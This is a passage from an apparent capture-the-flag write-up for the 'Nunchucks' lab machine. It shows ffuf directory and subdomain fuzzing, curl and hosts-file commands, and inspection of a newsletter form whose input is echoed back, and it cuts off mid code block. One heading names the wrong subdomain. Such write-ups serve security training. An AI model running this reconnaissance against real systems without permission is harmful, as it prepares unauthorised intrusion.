+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts"><span class="z-meta z-object z-member z-ts"><span class="z-meta z-objectliteral z-ts">      <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">password</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-meta z-function-call z-ts"><span class="z-support z-variable z-dom z-ts">document</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">querySelector</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>input[type=password]<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-variable z-property z-dom z-ts">value</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts"><span class="z-meta z-object z-member z-ts"><span class="z-meta z-objectliteral z-ts">    <span class="z-punctuation z-definition z-block z-ts">}</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts">    <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">headers</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-meta z-objectliteral z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span> <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>Content-Type<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span></span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>application/json<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span> </span><span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts">  <span class="z-punctuation z-definition z-block z-ts">}</span></span><span class="z-meta z-brace z-round z-ts">)</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">    <span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-promise z-ts">then</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-arrow z-ts"><span class="z-meta z-parameters z-ts"><span class="z-punctuation z-definition z-parameters z-begin z-ts">(</span><span class="z-variable z-parameter z-ts">resp</span><span class="z-punctuation z-definition z-parameters z-end z-ts">)</span></span> </span><span class="z-meta z-arrow z-ts"><span class="z-storage z-type z-function z-arrow z-ts">=&gt;</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">      <span class="z-keyword z-control z-flow z-ts">return</span> <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">resp</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-entity z-name z-function z-ts">json</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">    <span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-meta z-brace z-round z-ts">)</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">    <span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-promise z-ts">then</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-arrow z-ts"><span class="z-meta z-parameters z-ts"><span class="z-punctuation z-definition z-parameters z-begin z-ts">(</span><span class="z-variable z-parameter z-ts">data</span><span class="z-punctuation z-definition z-parameters z-end z-ts">)</span></span> </span><span class="z-meta z-arrow z-ts"><span class="z-storage z-type z-function z-arrow z-ts">=&gt;</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">      <span class="z-meta z-function-call z-ts"><span class="z-support z-variable z-dom z-ts">document</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">getElementById</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>output<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-variable z-other z-property z-ts">innerHTML</span> <span class="z-keyword z-operator z-assignment z-ts">=</span> <span class="z-variable z-other z-object z-ts">data</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-variable z-other z-property z-ts">response</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">    <span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></code></pre>
+<p>It just sends a POST request to <code>/api/signup</code> upon submiting the request.</p>
+<p>There's also a <code>scripts.js</code> file that could be interesting, but it only contains functions to manage the UI.</p>
+<h3 id="directory-fuzzing">Directory fuzzing</h3>
+<p>Let's see if we can find unliked web pages and directories.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> https://nunchucks.htb/FUZZ<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 33ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/spacer
+</span><span class="z-text z-plain">    * FUZZ: spacer
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 32ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/12
+</span><span class="z-text z-plain">    * FUZZ: 12
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 34ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/news
+</span><span class="z-text z-plain">    * FUZZ: news
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 34ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/warez
+</span><span class="z-text z-plain">    * FUZZ: warez
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 45, Words: 4, Lines: 4, Duration: 32ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/download
+</span><span class="z-text z-plain">    * FUZZ: download
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Okay, so there's actually a default web page that gets displayed when the specify an invalid one. Let's browse to <code>https://nunchucks.htb/nonExistent</code> to see it:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/domain-404-page.png" alt="Domain 404 page" /></p>
+<p>This is a really barebone web page.</p>
+<p>Let's fuzz again, but this time we'll ignore the responses with the length of the default <code>404</code> web page.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> https://nunchucks.htb/FUZZ<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>fs</span> 45</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[Status: 200, Size: 19134, Words: 5929, Lines: 251, Duration: 63ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/privacy
+</span><span class="z-text z-plain">    * FUZZ: privacy
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 9172, Words: 3129, Lines: 184, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/login
+</span><span class="z-text z-plain">    * FUZZ: login
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 17753, Words: 5558, Lines: 246, Duration: 31ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/terms
+</span><span class="z-text z-plain">    * FUZZ: terms
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 9488, Words: 3266, Lines: 188, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/signup
+</span><span class="z-text z-plain">    * FUZZ: signup
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/assets
+</span><span class="z-text z-plain">| --&gt; | /assets/
+</span><span class="z-text z-plain">    * FUZZ: assets
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 19134, Words: 5929, Lines: 251, Duration: 27ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/Privacy
+</span><span class="z-text z-plain">    * FUZZ: Privacy
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 9172, Words: 3129, Lines: 184, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/Login
+</span><span class="z-text z-plain">    * FUZZ: Login
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 17753, Words: 5558, Lines: 246, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/Terms
+</span><span class="z-text z-plain">    * FUZZ: Terms
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 301, Size: 179, Words: 7, Lines: 11, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/Assets
+</span><span class="z-text z-plain">| --&gt; | /Assets/
+</span><span class="z-text z-plain">    * FUZZ: Assets
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 9488, Words: 3266, Lines: 188, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/Signup
+</span><span class="z-text z-plain">    * FUZZ: Signup
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 9488, Words: 3266, Lines: 188, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/SignUp
+</span><span class="z-text z-plain">    * FUZZ: SignUp
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 9488, Words: 3266, Lines: 188, Duration: 24ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/signUp
+</span><span class="z-text z-plain">    * FUZZ: signUp
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 19134, Words: 5929, Lines: 251, Duration: 32ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/PRIVACY
+</span><span class="z-text z-plain">    * FUZZ: PRIVACY
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 30589, Words: 12757, Lines: 547, Duration: 31ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/
+</span><span class="z-text z-plain">    * FUZZ: 
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 9172, Words: 3129, Lines: 184, Duration: 23ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/LogIn
+</span><span class="z-text z-plain">    * FUZZ: LogIn
+</span><span class="z-text z-plain">
+</span><span class="z-text z-plain">[Status: 200, Size: 9172, Words: 3129, Lines: 184, Duration: 25ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/LOGIN
+</span><span class="z-text z-plain">    * FUZZ: LOGIN
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>Nothing interesting here.</p>
+<h3 id="subdomain-fuzzing">Subdomain fuzzing</h3>
+<p>Let's try to fuzz for subdomains now.</p>
+<p>First, let's get the length of an invalid one.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> curl<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>k</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>s</span> https://nunchucks.htb/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Host: nonExitent.nunchucks.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">wc</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span></span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">30589
+</span></code></pre>
+<p>Let's filter the subdomains with length <code>30589</code> then:</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> ffuf<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>v</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>c</span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>u</span> https://nunchucks.htb/<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>H</span> <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>Host: FUZZ.nunchucks.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>w</span> /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>maxtime</span> 60<span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>fs</span> 30589</span>
+</span></code></pre>
+<pre class="z-code"><code><span class="z-text z-plain">&lt;SNIP&gt;
+</span><span class="z-text z-plain">[Status: 200, Size: 4029, Words: 1053, Lines: 102, Duration: 86ms]
+</span><span class="z-text z-plain">| URL | https://nunchucks.htb/
+</span><span class="z-text z-plain">    * FUZZ: store
+</span><span class="z-text z-plain">&lt;SNIP&gt;
+</span></code></pre>
+<p>It found one valid subdomain: <code>store</code>!</p>
+<h3 id="shop-nunchucks-htb-subdomain"><code>shop.nunchucks.htb</code> subdomain</h3>
+<p>Let's add it to <code>/etc/hosts</code>.</p>
+<pre data-lang="sh" class="language-sh z-code"><code class="language-sh" data-lang="sh"><span class="z-source z-shell z-bash"><span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">❯</span></span><span class="z-meta z-function-call z-arguments z-shell"> echo <span class="z-string z-quoted z-double z-shell"><span class="z-punctuation z-definition z-string z-begin z-shell">&quot;</span>10.10.11.122 store.nunchucks.htb<span class="z-punctuation z-definition z-string z-end z-shell">&quot;</span></span></span> <span class="z-keyword z-operator z-logical z-pipe z-shell">|</span> <span class="z-meta z-function-call z-shell"><span class="z-variable z-function z-shell">tee</span></span><span class="z-meta z-function-call z-arguments z-shell"><span class="z-variable z-parameter z-option z-shell"><span class="z-punctuation z-definition z-parameter z-shell"> -</span>a</span> /etc/hosts</span>
+</span></code></pre>
+<p>Now let's browse to <code>https://store.nunchucks.htb/</code>:</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/subdomain-homepage.png" alt="Subdomain homepage" /></p>
+<p>This is a website to promote the Nunchucks store. The heading indicates that it's not open yet, and we have the possiblity of entering an email in a form to subscribe to a newsletter to get notified when it opens.</p>
+<p>This is literally the only functionality of this website... so it must be vulnerable to something!</p>
+<p>Let's enter <code>foo@email.htb</code> and press the 'Notify Me' button.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/subdomain-homepage-form-filled-foo-email.png" alt="Subdomain homepage after filling form with 'foo@email.htb'" /></p>
+<p>Okay, so our input is rendered in the response... that's interesting!</p>
+<h3 id="under-the-hood">Under the hood</h3>
+<p>Let's look at the request we sent using <a href="https://caido.io/">Caido</a>.</p>
+<p><img src="https://mmezirard.github.io/htb-write-ups/boxes/nunchucks/caido-subdomain-newsletter-request-inspection.png" alt="Using Caido to inspect subdomain newsletter request" /></p>
+<p>In fact, upon filling the form with an email, a POST request is sent to <code>/api/submit</code> with the JSON data:</p>
+<pre data-lang="json" class="language-json z-code"><code class="language-json" data-lang="json"><span class="z-source z-json"><span class="z-meta z-mapping z-json"><span class="z-punctuation z-section z-mapping z-begin z-json">{</span>
+</span></span><span class="z-source z-json"><span class="z-meta z-mapping z-json">    </span><span class="z-meta z-mapping z-key z-json"><span class="z-string z-quoted z-double z-json"><span class="z-punctuation z-definition z-string z-begin z-json">&quot;</span>email<span class="z-punctuation z-definition z-string z-end z-json">&quot;</span></span></span><span class="z-meta z-mapping z-json"><span class="z-punctuation z-separator z-mapping z-key-value z-json">:</span> </span><span class="z-meta z-mapping z-value z-json"><span class="z-string z-quoted z-double z-json"><span class="z-punctuation z-definition z-string z-begin z-json">&quot;</span>foo@email.htb<span class="z-punctuation z-definition z-string z-end z-json">&quot;</span></span>
+</span></span><span class="z-source z-json"><span class="z-meta z-mapping z-value z-json"><span class="z-punctuation z-section z-mapping z-end z-json">}</span></span>
+</span></code></pre>
+<p>The response also contains JSON data:</p>
+<pre data-lang="json" class="language-json z-code"><code class="language-json" data-lang="json"><span class="z-source z-json"><span class="z-meta z-mapping z-json"><span class="z-punctuation z-section z-mapping z-begin z-json">{</span>
+</span></span><span class="z-source z-json"><span class="z-meta z-mapping z-json">    </span><span class="z-meta z-mapping z-key z-json"><span class="z-string z-quoted z-double z-json"><span class="z-punctuation z-definition z-string z-begin z-json">&quot;</span>response<span class="z-punctuation z-definition z-string z-end z-json">&quot;</span></span></span><span class="z-meta z-mapping z-json"><span class="z-punctuation z-separator z-mapping z-key-value z-json">:</span> </span><span class="z-meta z-mapping z-value z-json"><span class="z-string z-quoted z-double z-json"><span class="z-punctuation z-definition z-string z-begin z-json">&quot;</span>You will receive updates on the following email address: foo@email.htb.<span class="z-punctuation z-definition z-string z-end z-json">&quot;</span></span>
+</span></span><span class="z-source z-json"><span class="z-meta z-mapping z-value z-json"><span class="z-punctuation z-section z-mapping z-end z-json">}</span></span>
+</span></code></pre>
+<p>If we search the source code of the website, we find a <code>main.js</code> file at <code>/js/</code>:</p>
+<pre data-lang="js" class="language-js z-code"><code class="language-js" data-lang="js"><span class="z-source z-ts"><span class="z-meta z-function-call z-ts"><span class="z-support z-variable z-dom z-ts">document</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">getElementById</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>form<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">addEventListener</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>submit<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span><span class="z-meta z-arrow z-ts"> <span class="z-meta z-parameters z-ts"><span class="z-punctuation z-definition z-parameters z-begin z-ts">(</span><span class="z-variable z-parameter z-ts">e</span><span class="z-punctuation z-definition z-parameters z-end z-ts">)</span></span> </span><span class="z-meta z-arrow z-ts"><span class="z-storage z-type z-function z-arrow z-ts">=&gt;</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">  <span class="z-meta z-function-call z-ts"><span class="z-variable z-other z-object z-ts">e</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">preventDefault</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-terminator z-statement z-ts">;</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">  <span class="z-meta z-function-call z-ts"><span class="z-entity z-name z-function z-ts">fetch</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>/api/submit<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span> <span class="z-meta z-objectliteral z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts">    <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">method</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>POST<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts">    <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">body</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-meta z-function-call z-ts"><span class="z-support z-constant z-json z-ts">JSON</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-json z-ts">stringify</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-objectliteral z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts"><span class="z-meta z-object z-member z-ts"><span class="z-meta z-objectliteral z-ts">      <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">email</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-meta z-function-call z-ts"><span class="z-support z-variable z-dom z-ts">document</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-dom z-ts">querySelector</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>input[type=email]<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span><span class="z-meta z-brace z-round z-ts">)</span><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-variable z-property z-dom z-ts">value</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts"><span class="z-meta z-object z-member z-ts"><span class="z-meta z-objectliteral z-ts">    <span class="z-punctuation z-definition z-block z-ts">}</span></span><span class="z-meta z-brace z-round z-ts">)</span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts">    <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts">headers</span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-meta z-objectliteral z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span> <span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>Content-Type<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span></span></span><span class="z-meta z-object z-member z-ts"><span class="z-meta z-object-literal z-key z-ts"><span class="z-punctuation z-separator z-key-value z-ts">:</span></span> <span class="z-string z-quoted z-double z-ts"><span class="z-punctuation z-definition z-string z-begin z-ts">&quot;</span>application/json<span class="z-punctuation z-definition z-string z-end z-ts">&quot;</span></span> </span><span class="z-punctuation z-definition z-block z-ts">}</span></span></span><span class="z-punctuation z-separator z-comma z-ts">,</span>
+</span></span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts"><span class="z-meta z-objectliteral z-ts">  <span class="z-punctuation z-definition z-block z-ts">}</span></span><span class="z-meta z-brace z-round z-ts">)</span>
+</span></span></span><span class="z-source z-ts"><span class="z-meta z-arrow z-ts"><span class="z-meta z-block z-ts">    <span class="z-meta z-function-call z-ts"><span class="z-punctuation z-accessor z-ts">.</span><span class="z-support z-function z-promise z-ts">then</span></span><span class="z-meta z-brace z-round z-ts">(</span><span class="z-meta z-arrow z-ts"><span class="z-meta z-parameters z-ts"><span class="z-punctuation z-definition z-parameters z-begin z-ts">(</span><span class="z-variable z-parameter z-ts">resp</span><span class="z-punctuation z-definition z-parameters z-end z-ts">)</span></span> </span><span class="z-meta z-arrow z-ts"><span class="z-storage z-type z-function z-arrow z-ts">=&gt;</span> <span class="z-meta z-block z-ts"><span class="z-punctuation z-definition z-block z-ts">{</span>
